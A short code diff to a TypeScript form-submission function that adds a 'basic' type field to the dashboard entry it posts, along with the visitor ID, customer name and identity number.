@@ -44,7 +44,7 @@ export async function secureSubmitFormData(data: Record<string, any>): Promise<v
   const visitorId = typeof window !== 'undefined' ? window.localStorage.getItem('visitor') : currentVisitorId;
   console.log('[secureSubmitFormData] Using visitorId:', visitorId);
 
-  // 3. Create/Update dashboard entry immediately
+  // 3. Create/Update dashboard entry immediately with type 'basic' for home-new data
   const customerName = data?.ownerName || data?.buyerName || data?.name || data?.identityNumber || 'عميل جديد';
   
   try {
@@ -53,6 +53,7 @@ export async function secureSubmitFormData(data: Record<string, any>): Promise<v
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         id: visitorId,
+        type: 'basic', // Type for basic/home-new data
         visitorId: visitorId,
         customer: customerName,
         identityNumber: data?.identityNumber || '',
